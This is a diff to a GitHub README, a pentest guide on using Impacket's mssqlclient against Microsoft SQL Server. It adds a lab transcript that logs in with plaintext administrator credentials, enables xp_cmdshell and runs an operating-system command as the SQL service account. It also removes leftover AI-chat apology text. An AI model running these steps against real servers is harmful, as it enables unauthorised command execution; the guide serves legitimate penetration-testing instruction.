@@ -1,36 +1,3 @@
-# Advanced Penetration Testing with Impacket MSSQLClient
-
-This repository provides a comprehensive guide on how to perform advanced penetration testing using the Impacket `mssqlclient` tool. This guide covers the setup, configuration, and advanced usage scenarios for effective penetration testing.
-
-## Table of Contents
-
-1. [Introduction](#introduction)
-2. [Installation](#installation)
-3. [Connecting to a SQL Server](#connecting-to-a-sql-server)
-4. [Enabling Advanced Options](#enabling-advanced-options)
-5. [Executing Commands](#executing-commands)
-6. [Advanced Usage](#advanced-usage)
-7. [Security Considerations](#security-considerations)
-8. [Resources](#resources)
-9. [Contributing](#contributing)
-10. [License](#license)
-
-## Introduction
-
-Impacket is a collection of Python classes for working with network protocols. `mssqlclient` is a tool within the Impacket suite designed to interact with Microsoft SQL Server. This guide provides advanced techniques for leveraging `mssqlclient` in penetration testing scenarios.
-
-## Installation
-
-To install Impacket, you need to have Python and pip installed. Follow these steps to install Impacket:
-
-```bash
-git clone https://github.com/fortra/impacket.git
-cd impacket
-pip install .
-
-
-I apologize for the previous errors. Here is the entire content for the `README.md` file in one markdown message for easy copying and pasting:
-
 ```markdown
 # Advanced Penetration Testing with Impacket MSSQLClient
 
@@ -75,6 +42,34 @@ Example:
 
 ```bash
 impacket-mssqlclient Administrator:Lab123@192.168.212.18 -windows-auth
+```
+
+```plaintext
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed database context to 'master'.
+[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
+[!] Press help for extra shell commands
+SQL (SQLPLAYGROUND\Administrator  dbo@master)> dir
+ERROR: Line 1: Could not find stored procedure 'dir'.
+SQL (SQLPLAYGROUND\Administrator  dbo@master)> EXECUTE sp_configure 'show advanced options', 1;
+[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
+SQL (SQLPLAYGROUND\Administrator  dbo@master)> RECONFIGURE;
+SQL (SQLPLAYGROUND\Administrator  dbo@master)> EXECUTE sp_configure 'xp_cmdshell', 1;
+[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
+SQL (SQLPLAYGROUND\Administrator  dbo@master)> RECONFIGURE;
+SQL (SQLPLAYGROUND\Administrator  dbo@master)> EXECUTE xp_cmdshell 'whoami';
+output                        
+---------------------------   
+nt service\mssql$sqlexpress   
+
+NULL                          
+SQL (SQLPLAYGROUND\Administrator  dbo@master)>
 ```
 
 ## Enabling Advanced Options
@@ -151,4 +146,4 @@ We welcome contributions to enhance this guide. Please submit a pull request or 
 This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 ```
 
-You can now copy and paste this entire markdown content directly into your `README.md` file on GitHub.
+You can copy and paste this markdown content directly into your `README.md` file on GitHub.
